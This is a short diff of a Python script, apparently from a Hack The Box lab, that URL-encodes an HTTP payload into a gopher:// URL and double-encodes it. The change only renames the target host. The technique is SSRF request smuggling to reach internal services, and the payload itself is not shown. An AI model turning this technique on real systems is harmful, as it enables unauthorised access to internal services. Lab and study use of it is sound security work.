@@ -12,7 +12,7 @@ enc1 = quote(payload, safe="/-._:")
 # 2) But force ONLY the HTTP version slash to be encoded
 enc1 = enc1.replace("HTTP/1.1", "HTTP%2F1.1", 1)
 
-u1 = f"gopher://dateserver.htb:80/_{enc1}"     # single-encoded
+u1 = f"gopher://someserver.htb:80/_{enc1}"     # single-encoded
 u2 = quote(u1, safe="/")                       # double-encoded (slashes preserved)
 
 print(u1)
